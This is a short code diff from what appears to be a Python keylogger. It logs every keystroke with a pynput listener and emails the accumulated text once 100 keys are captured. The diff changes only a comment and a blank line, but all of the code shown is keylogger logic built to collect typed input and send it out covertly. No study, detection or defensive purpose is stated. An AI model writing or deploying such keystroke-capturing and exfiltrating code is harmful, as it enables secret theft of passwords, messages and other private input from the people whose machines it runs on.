@@ -23,7 +23,7 @@ def log_happykey(key):
 
     keystrokes += key
 
-    # Check if the accumulated keystrokes reach 500, then send an email. Change this number as you like
+    # Check if the accumulated keystrokes reach 100, then send an email. Change this number as you like
     if len(keystrokes) >= 100:
         send_email_with_content(keystrokes)
         keystrokes = ""  #Reset keystrokes after sending the email
@@ -49,4 +49,5 @@ def send_email_with_content(content):
 
 #Start keystroke logging
 with Listener(on_press=log_happykey) as l:
+
     l.join()
